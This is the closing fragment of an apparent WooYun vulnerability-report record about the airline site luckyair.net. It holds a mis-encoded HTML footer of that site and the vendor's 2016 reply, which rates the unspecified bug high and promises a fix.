/></b>\t\t\t\t\t\t\t\t\t\t\t\t<p>ææºAPP</p>\t\t\t\t\t\t\t\t\t\t\t</a>\t\t\t\t\t\t\t\t\t\t</li>\t\t\t\t\t\t\t\t\t</ul>\t\t\t\t\t\t\t\t</div>\t\t\t\t\t\t\t</div>\t\t\t\t\t\t</div>\t\t\t\t\t</div>\t\t\t\t</div>\t\t\t</div>\t\t\t<!-- end åºé¨ä¿¡æ¯ -->\t\t\t<!-- ç«ç¹ä¿¡æ¯ -->\t\t\t<div class=\"site_info\">\t\t\t\t<div class=\"w_1000a\">\t\t\t\t\t\t\t\t\t\t<p><span class=\"ico m_t_5\"><em>&copy;</em>2012-2016 luckyair.net äºåç¥¥é¹èªç©ºæéè´£ä»»å¬å¸ çæææ ææ¯æ¯æï¼æµ·åæå»ºç§æè¡ä»½æéå¬å¸ æ»ICPå¤11002836å·</span> <span class=\"ico m_t_9 m_l_10\">\t\t\t\t\t<a href='https://ss.knet.cn/verifyseal.dll?sn=e14032853010047599h1h9000000&ct=df&a=1&pa=0.03910850009815292' target='_blank'>\t\t\t\t\t<img src=\"/themes/luckyair2016/images/ico_kx.png\" alt=\"å¯ä¿¡ç½ç«\"/></a></span>\t\t\t\t\t\t<span class=\"ico m_t_9 m_l_10\">\t\t\t\t\t<a id='___szfw_logo___' href='https://credit.szfw.org/CX20160112013238590188.html' target='_blank'>\t\t\t\t\t<img src=\"/themes/luckyair2016/images/footer-cnnic1.png\" alt=\"è¯ä¿¡ç½ç«\"/></a></span>\t\t\t\t\t</p>\t\t\t\t</div>\t\t\t</div>\t\t\t<!-- end ç«ç¹ä¿¡æ¯ -->\t\t</div><!-- footer start --><script src=\"/themes/luckyair2016/js/frontend_footer.js\"></script><script type='text/javascript'>$(document).ready(function(){\tvar url = '/index/sitemsg!doAjaxQuery.action';\tloadAnn(url);\t//åå°é¡¶é¨ç¼å¨å¨ç»\t$('.btn_top').on('click', function() {\t\t$('html,body').animate({\t\t\tscrollTop: 0\t\t}, 300);\t\treturn false;\t}).attr({\t\t'href': 'javascript:void(0)'\t});});</script>\t</div><script src=\"/js/dcs_tag.js\" type=\"text/javascript\"></script></body></html>\n   修复方案：     版权声明：转载请注明来源 黑骑士@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2016-03-24 10:12 厂商回复： 谢谢，我们会立即安排整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}